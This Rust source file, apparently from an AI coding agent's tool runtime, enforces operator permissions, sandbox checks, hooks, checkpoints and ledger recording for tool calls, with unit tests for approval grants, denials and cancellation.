/// the operator said no" — distinct from a tool that ran and failed
/// (D9). Exit codes, the ToolDenied event and the UI's denial glyph
/// key on the flag, never on message substrings.
fn tool_denial(msg: &str) -> String {
    serde_json::json!({ "ok": false, "denied": true, "error": msg }).to_string()
}

/// Execute one Wave 1 call through the orbit-tools registry with the
/// live permission layer: modes, pattern rules, folder trust, deny-read
/// and the secret scanner. The verdict above (whole-tool rules +
/// approval channel) already ran; this adds the pattern-level check.
fn execute_wave1(
    home: &Path,
    scope: &PermissionScope,
    call: &crate::PendingToolCall,
    args: &serde_json::Value,
    tool_cx: &orbit_tools::ToolContext,
) -> (String, Option<FileChange>) {
    use orbit_tools::permissions::{evaluate, parse_rule, RuleEffectSerde};

    // Merged rules: the new pattern scopes + the legacy whole-tool file.
    let mut rules = orbit_tools::executor::load_rules(home);
    // --allowedTools / --disallowedTools (command-line scope), from the
    // session's PermissionScope (S5) — not process env.
    // An explicit operator allowlist (--allowedTools / settings) is a
    // SCOPE statement: only what it names may run. The flag is tracked
    // separately so the pure-built-in bypass below cannot punch
    // through it (gate 6: a CI allowlist without calculator must deny
    // calculator with exit 2, not let the built-in run).
    if let Some(list) = &scope.allowlist {
        for entry in list {
            if let Some(r) = parse_rule(entry, RuleEffectSerde::Allow) {
                rules.rules.push(r);
            }
        }
    }
    for entry in &scope.disallowlist {
        if let Some(r) = parse_rule(entry, RuleEffectSerde::Deny) {
            rules.rules.push(r);
        }
    }

    // Find the tool and compute its permission key.
    let Some(tool) = orbit_tools::registry()
        .into_iter()
        .find(|t| t.name() == call.name)
    else {
        return (tool_denial("unknown tool (deny-by-default)"), None);
    };
    let key = tool.permission_key(args);
    let is_ro_cmd = call.name == "Bash"
        && orbit_tools::bash::is_readonly_command(
            args.get("command").and_then(|v| v.as_str()).unwrap_or(""),
        );

    // Hooks (phase 5): PreToolUse fires BEFORE every other gate —
    // hooks are the operator's policy layer and must see (and be able
    // to block) every call, whatever the machine's sandbox state.
    // PostToolUse sees the result.
    let hooks = orbit_engine::hooks::Hooks::load(home, project_trusted_home(home));
    let pre = hooks.fire(
        orbit_engine::hooks::HookEvent::PreToolUse,
        &serde_json::json!({
            "tool": call.name,
            "arguments": args,
        }),
    );
    if let Some(reason) = orbit_engine::hooks::blocked(&pre) {
        return (tool_denial(&format!("blocked by hook: {reason}")), None);
    }

    // S3: when the shell sandbox cannot run on this machine, a Bash
    // command must not execute unsandboxed on an allow verdict. The
    // operator opts in explicitly (ORBIT_ALLOW_UNSANDBOXED_BASH=1) or
    // the call is refused with the reason. Read-only commands are
    // still safe to run bare.
    let sandbox_up = call.name != "Bash"
        || is_ro_cmd
        || matches!(
            orbit_tools::sandbox::ShellSandbox::probe(),
            orbit_tools::sandbox::SandboxStatus::Confined
        )
        || std::env::var("ORBIT_ALLOW_UNSANDBOXED_BASH")
            .map(|v| v == "1")
            .unwrap_or(false);

    match evaluate(
        scope.mode,
        &rules,
        &key.tool,
        &key.pattern,
        tool.read_only(),
        is_ro_cmd,
    ) {
        // S3 binds on every path that would RUN the command: a plain
        // allow, and the ask-collapse (the operator approved the call
        // — but not running it bare on a sandbox-less machine).
        orbit_tools::permissions::Verdict::Allow if !sandbox_up => {
            return (sandbox_refusal(), None)
        }
        orbit_tools::permissions::Verdict::Allow => {}
        orbit_tools::permissions::Verdict::Deny(reason) => {
            return (tool_denial(&reason), None);
        }
        orbit_tools::permissions::Verdict::Ask if !sandbox_up => return (sandbox_refusal(), None),
        orbit_tools::permissions::Verdict::Ask => {
            // The whole-tool verdict above already asked the channel
            // (the operator pressed y). Pattern-level ask collapses to
            // allow here — the operator's approval IS the answer.
        }
    }

    // Execute with the SESSION's ToolContext (B2): the clone shares
    // the read-before-edit map, so a Read in an earlier round
    // satisfies Edit's precondition. A fresh context per call is what
    // made Edit always refuse.
    let cx = tool_cx.clone();

    let hooks = orbit_engine::hooks::Hooks::load(home, project_trusted_home(home));
    let pre = hooks.fire(
        orbit_engine::hooks::HookEvent::PreToolUse,
        &serde_json::json!({
            "tool": call.name,
            "arguments": args,
        }),
    );
    if let Some(reason) = orbit_engine::hooks::blocked(&pre) {
        return (tool_denial(&format!("blocked by hook: {reason}")), None);
    }

    // Checkpoint (phase 4): before the first WRITE of a turn, snapshot
    // the target file's current bytes so /rewind can restore them.
    // M11: remember the "before" bytes so the change can carry a real
    // diff to the Changes panel (line counts from the diff, hunks from
    // the same bytes — nothing invented).
    let mut before: Option<(std::path::PathBuf, Vec<u8>, String)> = None;
    if call.name == "Write" || call.name == "Edit" {
        if let Some(path_str) = args.get("file_path").and_then(|v| v.as_str()) {
            let path = orbit_tools::resolve_path(&cx, path_str);
            if path.exists() {
                let cps = orbit_engine::transcript::Checkpoints::new(home, &cx.session_id);
                // E7: one checkpoint id per turn — the context mints
                // it on first write and reuses it for the turn.
                let turn_cp = cx.turn_checkpoint_id();
                if let Ok(pre) = std::fs::read(&path) {
                    let _ = cps.snapshot_file(&turn_cp, &path);
                    before = Some((path, pre, turn_cp));
                }
            } else if call.name == "Write" {
                // A file created from nothing is still a change — a diff
                // against an empty "before". (There is nothing to
                // snapshot: the checkpoint restores what existed.) It used
                // to leave no event at all, so a new file never reached
                // the Changes or Review panel.
                before = Some((path, Vec::new(), cx.turn_checkpoint_id()));
            }
        }
    }

    // B1: a tool bug must become a tool error, never a dead worker
    // (a panic here used to take the whole process or the TUI thread).
    let result =
        match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| tool.run(args, &cx))) {
            Ok(result) => result,
            Err(panic) => {
                let reason = panic_message(&panic);
                orbit_tools::ToolResult::err(&format!(
                    "internal tool error: {reason} (the panic was contained)"
                ))
            }
        };
    let result = orbit_tools::finish(result, &cx, &call.id);

    // PostToolUse: the hook sees the (scanned) result.
    let _ = hooks.fire(
        orbit_engine::hooks::HookEvent::PostToolUse,
        &serde_json::json!({
            "tool": call.name,
            "ok": !result.is_error,
        }),
    );

    // M11: a successful checkpointed write carries a real diff — the
    // "before" bytes were captured above, the "after" bytes are read
    // now. Counts are the true totals; hunks are bounded (context 2,
    // first 4 hunks, 6 lines each) for the panel's line budget.
    let file_change = match (&before, result.is_error) {
        (Some((path, pre, cp)), false) => {
            let after = std::fs::read(path).ok();
            after.map(|post| {
                let old = String::from_utf8_lossy(pre).into_owned();
                let new = String::from_utf8_lossy(&post).into_owned();
                let (added, removed) = orbit_engine::diff::counts(&old, &new);
                let hunks = orbit_engine::diff::hunks(&old, &new);
                FileChange {
                    path: path.to_string_lossy().into_owned(),
                    added,
                    removed,
                    checkpoint_id: cp.clone(),
                    hunks,
                }
            })
        }
        _ => None,
    };

    (result.payload, file_change)
}

/// Is the current folder trusted (project-scope rules/hooks/skills
/// apply only after the operator trusted it once)? Resolved against
/// the caller's REAL home path — the command
/// line's --home does not set the env var, so any helper that resolved
/// trust through the env silently skipped project scope (the MCP call
/// path reported "mcp server not configured" for a configured, trusted
/// project server).
/// The command
/// line's --home does not set the env var, so any helper that resolved
/// trust through the env silently skipped project scope (the MCP call
/// path reported "mcp server not configured" for a configured, trusted
/// project server).
fn project_trusted_home(home: &Path) -> bool {
    let cwd = std::env::current_dir().unwrap_or_default();
    orbit_tools::permissions::FolderTrust::new(home.to_path_buf()).is_trusted(&cwd)
}

/// Execute one MCP call: resolve the server from the config, spawn,
/// call, scan the result (never trust external output).
fn execute_mcp(home: &Path, call: &crate::PendingToolCall, args: &serde_json::Value) -> String {
    let Some((server, tool)) = orbit_mcp::split_wire_name(&call.name) else {
        return tool_error("malformed mcp tool name");
    };
    let trusted = project_trusted_home(home);
    let cfg = orbit_mcp::McpConfig::load(home, trusted);
    let Some(server_cfg) = cfg.servers.get(&server) else {
        return tool_error(&format!("mcp server not configured: {server}"));
    };
    // The process-lifetime pool: the server was spawned once (at
    // definition build) and is reused across every call (phase 5 —
    // no re-spawn, no re-handshake per tool call).
    let mut call_args = args.clone();
    if let Some(obj) = call_args.as_object_mut() {
        obj.remove("server");
        obj.remove("tool");
    }
    let params = serde_json::json!({
        "name": tool,
        "arguments": call_args,
    });
    match orbit_mcp::POOL.request(&server, server_cfg, "tools/call", params) {
        Ok(result) => {
            // MCP content blocks → text.
            let text = mcp_result_text(&result);
            let scanned = orbit_tools::scan::scan_result(&text);
            serde_json::json!({
                "ok": true,
                "result": scanned.text,
                "redactions": scanned.redactions.len(),
            })
            .to_string()
        }
        Err(e) => tool_error(&format!("mcp call failed: {e}")),
    }
}

/// Pull the text out of an MCP tools/call result (content blocks).
fn mcp_result_text(result: &serde_json::Value) -> String {
    result
        .get("content")
        .and_then(|c| c.as_array())
        .map(|blocks| {
            blocks
                .iter()
                .filter_map(|b| b.get("text").and_then(|t| t.as_str()))
                .collect::<Vec<_>>()
                .join("\n")
        })
        .unwrap_or_else(|| result.to_string())
}

/// The subagent's tool executor: every call goes through execute_call
/// — the same permission path, ledger and approval channel as the
/// parent session (roadmap gate 5: the subagent's approval request
/// appears in the main session).
pub struct SubagentExecutor<'a> {
    home: std::path::PathBuf,
    session_id: String,
    approval: &'a mut dyn ApprovalChannel,
    grants: AutoGrants,
    /// The subagent inherits the parent session's permission scope
    /// (S5): same mode, same operator lists.
    pub scope: PermissionScope,
    /// The subagent's own tool context (B2): read-before-edit state
    /// shared across its calls, separate from the parent's.
    tool_cx: orbit_tools::ToolContext,
}

impl<'a> SubagentExecutor<'a> {
    /// The subagent's id: also the session id of its ledger records, so
    /// what a front-end shows can be matched to the chain.
    pub fn id(&self) -> &str {
        &self.session_id
    }

    pub fn new(home: std::path::PathBuf, approval: &'a mut dyn ApprovalChannel) -> Self {
        let session_id = format!("subagent-{}", ulid::Ulid::new());
        let working_dir =
            std::env::current_dir().unwrap_or_else(|_| std::path::Path::new(".").to_path_buf());
        let tool_cx = orbit_tools::ToolContext::new(home.clone(), session_id.clone(), working_dir);
        Self {
            session_id,
            home,
            approval,
            grants: AutoGrants::new(),
            scope: PermissionScope::default(),
            tool_cx,
        }
    }
}

impl orbit_engine::ToolExecutor for SubagentExecutor<'_> {
    fn begin_turn(&mut self, config: &orbit_engine::TurnConfig) {
        remember_turn_config(&self.tool_cx, config);
    }

    fn execute(
        &mut self,
        calls: &[crate::PendingToolCall],
        _round: u32,
    ) -> Vec<orbit_engine::ToolRoundResult> {
        let cx = self.tool_cx.clone();
        run_until_cancelled(
            &cx,
            calls,
            |call| {
                let decision_id = ulid::Ulid::new().to_string();
                let (content, _) = execute_call(
                    &self.home,
                    &self.session_id,
                    &decision_id,
                    call,
                    false,
                    true,
                    self.approval,
                    &mut self.grants,
                    &self.scope,
                    &self.tool_cx,
                )
                .unwrap_or_else(|e| (tool_error(&e), None));
                orbit_engine::ToolRoundResult {
                    call_id: call.id.clone(),
                    content,
                }
            },
            |_| {},
        )
    }

    fn begin_cancel_scope(&mut self, token: &orbit_provider_http::CancelToken) {
        begin_cancel_scope(&self.tool_cx, token);
    }

    fn end_cancel_scope(&mut self) {
        self.tool_cx.pop_cancel_check();
    }
}

/// The provider configuration of the turn a session is running (gateway,
/// model, credential, pricing), kept on the session's tool context. A
/// subagent runs on THIS, not on whatever the environment names.
pub struct SessionTurnConfig(pub orbit_engine::TurnConfig);

/// Keep the running turn's provider configuration where its tools can
/// reach it. Every front-end's executor does this when the engine starts a
/// turn (`ToolExecutor::begin_turn`).
pub fn remember_turn_config(cx: &orbit_tools::ToolContext, config: &orbit_engine::TurnConfig) {
    cx.set_ext(SessionTurnConfig(config.clone()));
}

/// What a subagent is doing, for a front-end that shows it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SubagentUpdate {
    Started {
        id: String,
        name: String,
        task: String,
    },
    /// The subagent started a tool call (or a new round): what it is doing.
    Progress { id: String, action: String },
    /// Its turn ended: `ok` is whether it completed, `report` its final
    /// words (or the error that stopped it).
    Finished {
        id: String,
        ok: bool,
        report: String,
    },
}

/// Where a front-end wants subagent updates; attached to its tool context
/// with `set_ext`.
#[derive(Clone)]
pub struct SubagentObserver(pub std::sync::Arc<dyn Fn(&SubagentUpdate) + Send + Sync>);

/// The configuration a subagent runs on: the SESSION's (same gateway,
/// model, credential and pricing as the turn that called it), without
/// sampling overrides (E8: subagents inherit none). Only a context that
/// was never told (a test, a bare executor) falls back to the environment.
fn session_subagent_config(cx: &orbit_tools::ToolContext, home: &Path) -> orbit_engine::TurnConfig {
    match cx.ext::<SessionTurnConfig>() {
        Some(session) => {
            let mut config = session.0.clone();
            config.sampling = None;
            config
        }
        None => subagent_turn_config(home),
    }
}

/// Derive a TurnConfig for a subagent from the environment alone
/// (ORBIT_GATE_URL, ORBIT_MODEL, …). Only the fallback: a session's own
/// configuration (`SessionTurnConfig`) is what a subagent normally runs on.
pub fn subagent_turn_config(_home: &Path) -> orbit_engine::TurnConfig {
    let gate = std::env::var("ORBIT_GATE_URL").unwrap_or_else(|_| "http://127.0.0.1:4001".into());
    let model = std::env::var("ORBIT_MODEL").unwrap_or_else(|_| "glm-5.2".into());
    orbit_engine::dispatch::TurnConfig {
        provider_id: std::env::var("ORBIT_PROVIDER").unwrap_or_else(|_| "local".into()),
        gate,
        model,
        sampling: None, // E8: subagents inherit no sampling
        kind: orbit_engine::dispatch::ProviderKind::OpenAiCompatible,
        credential_env: std::env::var("ORBIT_CREDENTIAL_ENV").ok(),
        pricing: None,
        max_output_tokens: 0,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_call(name: &str, args: &[u8]) -> crate::PendingToolCall {
        crate::PendingToolCall {
            index: 0,
            id: "call-1".into(),
            name: name.into(),
            arguments: args.to_vec(),
        }
    }

    fn test_home(name: &str) -> std::path::PathBuf {
        let home = std::env::temp_dir().join(format!("orbit-tool-runtime-{name}"));
        let _ = std::fs::remove_dir_all(&home);
        std::fs::create_dir_all(&home).unwrap();
        home
    }

    /// A session context for tests: same shape the executors build.
    /// The working dir is the given path (file tools resolve relative
    /// paths against it).
    fn test_cx(work_dir: &std::path::Path) -> orbit_tools::ToolContext {
        orbit_tools::ToolContext::new(
            work_dir.to_path_buf(),
            "test-session".into(),
            work_dir.to_path_buf(),
        )
    }

    fn session_config(model: &str) -> orbit_engine::TurnConfig {
        orbit_engine::TurnConfig {
            provider_id: "mine".into(),
            gate: "https://gateway.example:8443/v1".into(),
            model: model.into(),
            kind: orbit_engine::ProviderKind::Anthropic,
            credential_env: Some("MY_KEY".into()),
            pricing: None,
            max_output_tokens: 4096,
            sampling: Some((Some(0.2), None)),
        }
    }

    /// A subagent runs on the SESSION's provider, model and credential; it
    /// used to read ORBIT_GATE_URL / ORBIT_MODEL, which only `-p` exports, and
    /// otherwise fall back to a hard-coded gateway and model.
    #[test]
    fn a_subagent_inherits_the_sessions_provider() {
        let cx = test_cx(&test_home("sub-inherit"));
        remember_turn_config(&cx, &session_config("m1"));
        let c = session_subagent_config(&cx, std::path::Path::new("/h"));
        assert_eq!(c.gate, "https://gateway.example:8443/v1");
        assert_eq!(c.model, "m1");
        assert_eq!(c.provider_id, "mine");
        assert_eq!(c.credential_env.as_deref(), Some("MY_KEY"));
        assert_eq!(c.kind, orbit_engine::ProviderKind::Anthropic);
        assert_eq!(c.max_output_tokens, 4096);
        // E8: sampling overrides are the session's, not the subagent's.
        assert!(c.sampling.is_none());
        // The next turn (after /model) is what the next subagent runs on.
        remember_turn_config(&cx, &session_config("m2"));
        assert_eq!(
            session_subagent_config(&cx, std::path::Path::new("/h")).model,
            "m2"
        );
    }

    /// Only a context nobody told (a test, a bare executor) reads the
    /// environment.
    #[test]
    fn a_bare_context_falls_back_to_the_environment() {
        let cx = test_cx(&test_home("sub-bare"));
        let c = session_subagent_config(&cx, std::path::Path::new("/h"));
        assert_eq!(
            c.gate,
            subagent_turn_config(std::path::Path::new("/h")).gate
        );
    }

    /// A channel that always returns the given verdict (for tests).
    struct FixedChannel(ApprovalVerdict);
    impl ApprovalChannel for FixedChannel {
        fn ask(&mut self, _req: &ApprovalRequest, _auto: bool) -> ApprovalVerdict {
            self.0
        }
    }

    /// The proof surface hears every record as it lands, in order, with the
    /// record's own hash — so what the Activity panel shows can be checked
    /// against the chain. (The sink was declared, never wired.)
    #[test]
    fn every_ledger_record_is_announced_in_order_with_its_hash() {
        let home = test_home("announce");
        let call = make_call("calculator", br#"{"expression":"2*(3+4)"}"#);
        let cx = test_cx(&home.join("work"));
        let heard =
            std::sync::Arc::new(std::sync::Mutex::new(Vec::<orbit_tools::LedgerNote>::new()));
        let sink = heard.clone();
        cx.set_ledger_sink(Some(std::sync::Arc::new(
            move |n: &orbit_tools::LedgerNote| {
                sink.lock().unwrap().push(n.clone());
            },
        )));
        let mut ch = FixedChannel(ApprovalVerdict::Deny); // auto-tools: not asked
        execute_call(
            &home,
            "s1",
            "d1",
            &call,
            true,
            false,
            &mut ch,
            &mut AutoGrants::new(),
            &PermissionScope::default(),
            &cx,
        )
        .unwrap();
        let heard = heard.lock().unwrap();
        let kinds: Vec<&str> = heard.iter().map(|n| n.kind).collect();
        assert_eq!(kinds, ["intent", "verdict", "result"]);
        assert!(heard[1].fact.starts_with("allowed — "), "{}", heard[1].fact);
        assert_eq!(heard[2].fact, "ok");
        assert!(heard.iter().all(|n| n.target.starts_with("calculator")));
        // The digests ARE the chain: each is a real record's hash and the
        // last is the ledger's head.
        let (records, head) = orbit_ledger::verify_ledger(&home.join("ledger")).unwrap();
        for n in heard.iter() {
            assert!(
                records.iter().any(|r| r.self_hash == n.digest),
                "{} is not in the ledger",
                n.digest
            );
        }
        assert_eq!(heard.last().unwrap().digest, head);
    }

    #[test]
    fn auto_tools_executes_and_records_digest_only() {
        let home = test_home("auto");
        let call = make_call("calculator", br#"{"expression":"2*(3+4)"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::Deny); // shouldn't be asked
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            true,
            false,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&home.join("work")),
        )
        .unwrap();
        assert!(out.contains("14"));
        let mut ledger = String::new();
        for e in std::fs::read_dir(home.join("ledger/segments"))
            .unwrap()
            .flatten()
        {
            let bytes = std::fs::read(e.path()).unwrap_or_default();
            ledger.push_str(&String::from_utf8_lossy(&bytes));
        }
        assert!(ledger.contains("tool_intent"));
        assert!(ledger.contains("tool_verdict"));
        assert!(ledger.contains("tool_result"));
        assert!(ledger.contains("arguments_sha256"));
        assert!(
            !ledger.contains("2*(3+4)"),
            "raw arguments must not enter ledger"
        );
        assert!(
            !ledger.contains("\"result\":14"),
            "raw output must not enter ledger"
        );
    }

    #[test]
    fn non_tty_denies_write_without_allow_path() {
        // B4: headless denies an ask-class tool with a visible reason;
        // read-only tools run (that is the fix, not a regression).
        let home = test_home("deny");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let call = make_call("Write", br#"{"file_path":"out.txt","content":"x"}"#);
        let mut ch = StdApprovalChannel::new(false); // non-interactive
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            false,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(
            out.contains("non-interactive"),
            "headless ask must deny with the visible reason: {out}"
        );
        assert!(!dir.join("out.txt").exists());
    }

    #[test]
    fn unknown_tool_is_denied_even_with_auto_tools() {
        let home = test_home("unknown");
        let call = make_call("shell", br#"{"cmd":"id"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::AllowOnce);
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            true,
            false,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&home.join("work")),
        )
        .unwrap();
        assert!(out.contains("unknown tool"));
    }

    #[test]
    fn allow_once_executes() {
        let home = test_home("allow-once");
        let call = make_call("calculator", br#"{"expression":"3+4"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::AllowOnce);
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&home.join("work")),
        )
        .unwrap();
        assert!(out.contains("7"));
    }

    #[test]
    fn deny_does_not_execute() {
        let home = test_home("deny-manual");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let call = make_call("Write", br#"{"file_path":"out.txt","content":"x"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::Deny);
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(out.contains("operator denied"));
        assert!(!dir.join("out.txt").exists());
        // D9: the ledger records a DENIED status, not error — refusal is
        // distinct from failure for audit purposes.
        let mut ledger = String::new();
        for e in std::fs::read_dir(home.join("ledger/segments"))
            .unwrap()
            .flatten()
        {
            let bytes = std::fs::read(e.path()).unwrap_or_default();
            ledger.push_str(&String::from_utf8_lossy(&bytes));
        }
        assert!(
            ledger.contains("\"status\":\"denied\""),
            "denied verdict must record status=denied, got: {ledger}"
        );
    }

    fn write_once(
        home: &std::path::Path,
        cx: &orbit_tools::ToolContext,
        args: &[u8],
    ) -> (String, Option<FileChange>) {
        let mut ch = FixedChannel(ApprovalVerdict::AllowOnce);
        execute_call(
            home,
            "s1",
            "d1",
            &make_call("Write", args),
            false,
            true,
            &mut ch,
            &mut AutoGrants::new(),
            &PermissionScope::default(),
            cx,
        )
        .unwrap()
    }

    /// A file created from nothing is a change. It used to leave no event
    /// at all, so the commonest thing an agent does never reached the
    /// Changes or Review panel.
    #[test]
    fn a_created_file_is_reported_as_a_change() {
        let home = test_home("new-file");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let (out, change) = write_once(
            &home,
            &test_cx(&dir),
            br#"{"file_path":"notes.txt","content":"one\ntwo\n"}"#,
        );
        assert!(out.contains("\"ok\":true"), "{out}");
        let change = change.expect("a created file is a change");
        assert!(change.path.ends_with("notes.txt"), "{}", change.path);
        assert_eq!((change.added, change.removed), (2, 0));
        let hunks = change.hunks.expect("a diff against an empty before");
        assert!(hunks[0].lines.iter().all(|(m, _)| *m == '+'));
    }

    /// Overwriting keeps diffing against what was there.
    #[test]
    fn overwriting_a_file_diffs_against_its_old_content() {
        let home = test_home("overwrite");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("f.txt"), "a\nb\n").unwrap();
        // An existing file must be read in full, in this session, first.
        let cx = test_cx(&dir);
        let read = orbit_tools::registry()
            .into_iter()
            .find(|t| t.name() == "Read")
            .unwrap()
            .run(&serde_json::json!({ "file_path": "f.txt" }), &cx);
        assert!(!read.is_error, "{}", read.payload);
        let (out, change) = write_once(&home, &cx, br#"{"file_path":"f.txt","content":"a\nc\n"}"#);
        let change = change.unwrap_or_else(|| panic!("an overwrite is a change: {out}"));
        assert_eq!((change.added, change.removed), (1, 1));
    }

    /// A write that failed changed nothing: no event.
    #[test]
    fn a_failed_write_is_not_a_change() {
        let home = test_home("failed-write");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("plain"), "x").unwrap();
        // `plain` is a file, so nothing can be created under it.
        let (_, change) = write_once(
            &home,
            &test_cx(&dir),
            br#"{"file_path":"plain/inside.txt","content":"y"}"#,
        );
        assert!(change.is_none());
    }

    #[test]
    fn r_grant_allows_subsequent_calls_without_prompt() {
        // B4: R-grants apply to ask-class tools; Write asks in default
        // mode, so the grant (not the channel) approves the second call.
        let home = test_home("r-grant");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let call = make_call("Write", br#"{"file_path":"a.txt","content":"1"}"#);

        // First call: R verdict → grant + execute.
        let mut ch = FixedChannel(ApprovalVerdict::AllowSession);
        let mut grants = AutoGrants::new();
        let (out1, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(out1.contains("\"ok\":true"), "first write ran: {out1}");
        assert!(grants.is_granted("Write"));

        // Second call: auto-approved from the grant (channel not asked).
        let call2 = make_call("Write", br#"{"file_path":"b.txt","content":"2"}"#);
        let mut ch2 = FixedChannel(ApprovalVerdict::Deny); // would deny, but shouldn't be asked
        let (out2, _) = execute_call(
            &home,
            "s1",
            "d2",
            &call2,
            false,
            true,
            &mut ch2,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(
            dir.join("b.txt").exists(),
            "R-grant should auto-approve the second call: {out2}"
        );
    }

    #[test]
    fn deny_revokes_r_grant() {
        let home = test_home("revoke");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let call = make_call("Write", br#"{"file_path":"c.txt","content":"x"}"#);

        // Grant via R.
        let mut ch = FixedChannel(ApprovalVerdict::AllowSession);
        let mut grants = AutoGrants::new();
        let _ = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(grants.is_granted("Write"));

        // Revoke explicitly (the operator pressed n → revoke path).
        grants.revoke("Write");
        assert!(!grants.is_granted("Write"));

        // Now the channel is asked again — deny.
        let mut ch2 = FixedChannel(ApprovalVerdict::Deny);
        let call2 = make_call("Write", br#"{"file_path":"d.txt","content":"y"}"#);
        let (out, _) = execute_call(
            &home,
            "s1",
            "d2",
            &call2,
            false,
            true,
            &mut ch2,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(out.contains("operator denied"));
        assert!(!dir.join("d.txt").exists());
        assert!(!grants.is_granted("Write"));
    }

    #[test]
    fn r_grant_does_not_apply_to_unknown_tools() {
        let home = test_home("r-unknown");
        let call = make_call("shell", br#"{"cmd":"id"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::AllowSession);
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&home.join("work")),
        )
        .unwrap();
        assert!(out.contains("unknown tool"));
        assert!(
            !grants.is_granted("shell"),
            "unknown tool should not be granted"
        );
    }

    #[test]
    fn r_grant_is_per_tool() {
        // B4: grants are per-tool-name; an R on Write does not leak to
        // Edit. Edit asks the channel on its own.
        let home = test_home("r-per-tool");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let write = make_call("Write", br#"{"file_path":"e.txt","content":"x"}"#);

        // Grant R on Write.
        let mut ch = FixedChannel(ApprovalVerdict::AllowSession);
        let mut grants = AutoGrants::new();
        let _ = execute_call(
            &home,
            "s1",
            "d1",
            &write,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(grants.is_granted("Write"));
        assert!(
            !grants.is_granted("Edit"),
            "R on Write should not grant Edit"
        );

        // Edit should still ask the channel.
        let mut ch2 = FixedChannel(ApprovalVerdict::Deny);
        let edit = make_call(
            "Edit",
            br#"{"file_path":"e.txt","old_string":"x","new_string":"y"}"#,
        );
        let (out, _) = execute_call(
            &home,
            "s1",
            "d2",
            &edit,
            false,
            true,
            &mut ch2,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(out.contains("operator denied"), "the channel must be asked");
        assert!(!grants.is_granted("Edit"), "a Deny must not create a grant");
    }

    #[test]
    fn revoke_all_clears_grants() {
        let mut grants = AutoGrants::new();
        grants.grant("calculator");
        grants.grant("list_models");
        assert_eq!(grants.granted_tools().len(), 2);
        grants.revoke_all();
        assert!(grants.granted_tools().is_empty());
    }

    #[test]
    fn ledger_records_r_grant_reason() {
        let home = test_home("r-ledger");
        let call = make_call("calculator", br#"{"expression":"2+2"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::AllowSession);
        let mut grants = AutoGrants::new();
        let _ = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&home.join("work")),
        )
        .unwrap();

        let mut ledger = String::new();
        for e in std::fs::read_dir(home.join("ledger/segments"))
            .unwrap()
            .flatten()
        {
            let bytes = std::fs::read(e.path()).unwrap_or_default();
            ledger.push_str(&String::from_utf8_lossy(&bytes));
        }
        // The first call's verdict should be "operator approved" (the R grant
        // is applied, and the reason reflects approval).
        assert!(ledger.contains("operator approved") || ledger.contains("R-grant"));
    }
}

#[cfg(test)]
mod cancel_tests {
    use super::*;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    fn call(i: u32) -> crate::PendingToolCall {
        crate::PendingToolCall {
            index: i,
            id: format!("c{i}"),
            name: "Bash".into(),
            arguments: br#"{"command":"true"}"#.to_vec(),
        }
    }

    fn cx() -> orbit_tools::ToolContext {
        let d = std::env::temp_dir();
        orbit_tools::ToolContext::new(d.clone(), "cancel-test".into(), d)
    }

    /// After Esc, only the call in flight was killed; the next calls of
    /// the round still ran (a second Bash command ran to completion).
    /// Now the rest are answered "cancelled by user" and never start.
    #[test]
    fn calls_after_esc_do_not_run_and_say_so() {
        let cx = cx();
        let flag = Arc::new(AtomicBool::new(false));
        let f = flag.clone();
        cx.push_cancel_check(Arc::new(move || f.load(Ordering::SeqCst)));
        let calls = [call(0), call(1), call(2)];
        let (mut ran, mut skipped) = (Vec::new(), Vec::new());
        let results = run_until_cancelled(
            &cx,
            &calls,
            |c| {
